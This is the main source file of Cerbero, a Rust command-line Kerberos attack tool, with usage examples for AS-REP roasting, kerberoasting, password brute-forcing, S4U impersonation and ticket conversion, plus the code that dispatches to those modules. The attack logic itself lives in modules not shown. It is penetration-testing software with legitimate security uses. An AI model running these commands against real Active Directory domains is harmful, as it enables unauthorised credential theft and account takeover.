//! # Cerbero
//! ## TODOS
//! - asreproast: produce valid hashcat formats for aes128 and aes256
//! - asreproast: produce valid john formats
//! - kerberoast: produce valid hashcat formats for aes128 and aes256
//! - kerberoast: produce valid john formats
//! - kerberoast: include swtich to select the desired cipher
//! - command to extract preauth signatures
//! 
//! ## Ask module
//! To request Kerberos tickets.
//! 
//! Ask TGT:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!!
//! ```
//! 
//! Ask TGS:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --spn ldap/under.world
//! ```
//! 
//! Perform S4u2self:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus
//! ```
//! 
//! Perform S4u2proxy:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus --spn ldap/under.world
//! ```
//! ### TODO
//! - renew tickets
//! 
//! ## AsRepRoast module
//! To discover users that do not require pre-authentication and retrieve a ticket to crack with hashcat or john.
//! 
//! Check many users:
//! ```shell
//! cerbero asreproast under.world users.txt
//! ```
//! 
//! Check many users with weak RC4 cipher (easier to crack):
//! ```shell
//! cerbero asreproast under.world users.txt --cipher rc4
//! ```
//! 
//! 
//! ### TODO
//! - Perform LDAP query to retrieve the users with no pre-authentication required
//! 
//! 
//! ## Brute module
//! To discover user credentials by performing kerberos bruteforce attack.
//! 
//! Test many users and passwords:
//! ```shell
//! cerbero brute under.world users.txt passwords.txt
//! ```
//! 
//! Test one user and many passwords:
//! ```shell
//! cerbero brute under.world Zeus passwords.txt
//! ```
//! 
//! Test many users and one password:
//! ```shell
//! cerbero brute under.world users.txt Olympus1234
//! ```
//! 
//! Test one user and one password:
//! ```shell
//! cerbero brute under.world Zeus Olympus1234
//! ```
//! 
//! ## Convert module
//! To convert ticket files between krb (Windows) and ccache (Linux) format.
//! 
//! 
//! Convert ccache to krb:
//! ```shell
//! cerbero convert hades.ccache hades.krb
//! ```
//! 
//! Convert krb to ccache:
//! ```shell
//! cerbero convert hades.krb hades.ccache
//! ```
//! 
//! ## Craft module
//! Module to craft tickets, and create Golden and Silver tickets.
//! 
//! ### TODO
//! - craft golden tickets
//! - craft silver tickets
//!
//! ## Edit module
//! To edit several parts of a ticket, such as the target spn 
//!
//! ### TODO
//! - edit target spn of a ticket
//! - split ticket file in several file with one ticket per file
//! - join several ticket files in just one file
//!
//! ## Kerberoast module
//! To format encrypted part of tickets in order to be cracked by hashcat or john.
//! 
//! ```shell
//! cerbero kerberoast -s services.txt --realm under.world --user Hades -p IamtheKingofD34d!!
//! ```
//! 
//! ### TODO
//! - Perform LDAP query to retrieve users with services
//! 
//! 
//! ## List module
//! Show contents of a tickets file.
//! 
//! 
//! ```shell
//! cerbero list hades.ccache
//! ```
//! 
//! ### TODO
//! - Show session keys
//! - Show keytab contents
//!
//! ## Purge module
//! To delete current files
//!
//! TODO

mod args;
mod ask;
mod asreproast;
mod brute;
mod convert;
mod crack;
mod cred_format;
mod error;
mod file;
mod kdc_req_builder;
mod kerberoast;
mod krb_cred_plain;
mod krb_user;
mod list;
mod senders;
mod transporter;
mod utils;

use crate::error::Result;
use args::{args, Arguments, ArgumentsParser};
use ask::{ask_s4u2proxy, ask_s4u2self, ask_tgs, ask_tgt};
use file::read_file_lines;
use krb_user::KerberosUser;
use log::error;
use stderrlog;
use utils::resolve_and_get_tranporter;

fn init_log(verbosity: usize) {
    stderrlog::new()
        .module(module_path!())
        .verbosity(verbosity)
        .init()
        .unwrap();
}

fn main() {
    let args = ArgumentsParser::parse(&args().get_matches());

    if let Err(error) = main_inner(args) {
        error!("{}", error);
    }
}

fn main_inner(args: Arguments) -> Result<()> {
    match args {
        Arguments::Ask(args) => ask(args),
        Arguments::AsRepRoast(args) => asreproast(args),
        Arguments::Brute(args) => brute(args),
        Arguments::Convert(args) => convert(args),
        Arguments::KerbeRoast(args) => kerberoast(args),
        Arguments::List(args) => list(args),
    }
}

fn ask(args: args::ask::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    let creds_file = utils::get_ticket_file(
        args.out_file,
        &args.username,
        &args.credential_format,
    );

    let impersonate_user = match args.impersonate_user {
        Some(username) => Some(KerberosUser::new(username, args.realm.clone())),
        None => None,
    };

    let user = KerberosUser::new(args.username, args.realm);

    match args.service {
        Some(service) => match impersonate_user {
            Some(impersonate_user) => {
                return ask_s4u2proxy(
                    user,
                    impersonate_user,
                    service,
                    &creds_file,
                    &*transporter,
                    args.user_key.as_ref(),
                    args.credential_format,
                );
            }
            None => {
                return ask_tgs(
                    user,
                    service,
                    &creds_file,
                    &*transporter,
                    args.user_key.as_ref(),
                    args.credential_format,
                );
            }
        },
        None => match impersonate_user {
            Some(impersonate_user) => {
                return ask_s4u2self(
                    user,
                    impersonate_user,
                    &creds_file,
                    &*transporter,
                    args.user_key.as_ref(),
                    args.credential_format,
                );
            }
            None => match &args.user_key {
                Some(user_key) => {
                    return ask_tgt(
                        &user,
                        user_key,
                        args.preauth,
                        &*transporter,
                        args.credential_format,
                        &creds_file,
                    );
                }
                None => {
                    return Err("Required credentials to request a TGT")?;
                }
            },
        },
    }
}

fn convert(args: args::convert::Arguments) -> Result<()> {
    init_log(args.verbosity);
    let in_file = match args.in_file {
        Some(filename) => filename,
        None => utils::get_env_ticket_file().ok_or(
            "Unable to detect input file, specify -i/--input or KRB5CCNAME",
        )?,
    };

    return convert::convert(&in_file, &args.out_file, args.cred_format);
}

fn list(args: args::list::Arguments) -> Result<()> {
    let in_file = match args.in_file {
        Some(filename) => filename,
        None => utils::get_env_ticket_file()
            .ok_or("Specify file or set KRB5CCNAME")?,
    };
    return list::list(&in_file, args.etypes, args.flags);
}

fn brute(args: args::brute::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let usernames = match read_file_lines(&args.users) {
        Ok(users) => users,
        Err(_) => vec![args.users],
    };

    let passwords = match read_file_lines(&args.passwords) {
        Ok(passwords) => passwords,
        Err(_) => vec![args.passwords],
    };

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    return brute::brute(
        &args.realm,
        usernames,
        passwords,
        &*transporter,
        args.cred_format,
    );
}

fn asreproast(args: args::asreproast::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let usernames = match read_file_lines(&args.users) {
        Ok(users) => users,
        Err(_) => vec![args.users],
    };

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    return asreproast::asreproast(
        &args.realm,
        usernames,
        args.crack_format,
        &*transporter,
        &args.cipher
    );
}


fn kerberoast(args: args::kerberoast::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let services = match read_file_lines(&args.services) {
        Ok(users) => users,
        Err(_) => vec![args.services],
    };

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    let creds_file = utils::get_ticket_file(
        args.out_file,
        &args.username,
        &args.credential_format,
    );
    
    let user = KerberosUser::new(args.username, args.realm);    

    return kerberoast::kerberoast(
        user,
        services,
        &creds_file,
        args.user_key.as_ref(),
        &*transporter,
        args.credential_format,
        args.crack_format,
    );
}

